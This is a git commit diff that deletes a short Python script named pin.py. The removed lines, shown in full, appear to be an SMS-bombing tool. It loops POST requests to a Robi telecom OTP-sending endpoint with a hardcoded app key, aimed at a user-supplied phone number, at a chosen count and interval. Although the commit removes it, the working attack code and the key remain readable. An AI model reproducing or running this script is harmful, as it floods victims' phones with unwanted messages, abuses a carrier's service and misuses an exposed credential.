e2df1f82483805f8ed8507144b6c78d34a5e3f2e
Mr. Foisal <83734733+MohammadFoisal@users.noreply.github.com>
2022-01-08 23:55:45 +0600

    Update pin.py

--- pin.py
+++ pin.py
@@ -1,15 +1,1 @@
-import requests,  time
-wait_time = int(input("\n\nEnter wait time in second :: "))
-num=input("\n\ninput Number: 01")
-i=int(input("\n\n\tEnter Amoun: "))
 
-url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=123455&app_version=78&msisdn=8801"+num
-y=0
-while y<i:
-    try:
-        x=requests.post(url, headers = {"x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})
-        y=y+1
-        print(y, "Sms Sending", x.text)
-        time.sleep(wait_time)
-    except:
-        print("error")
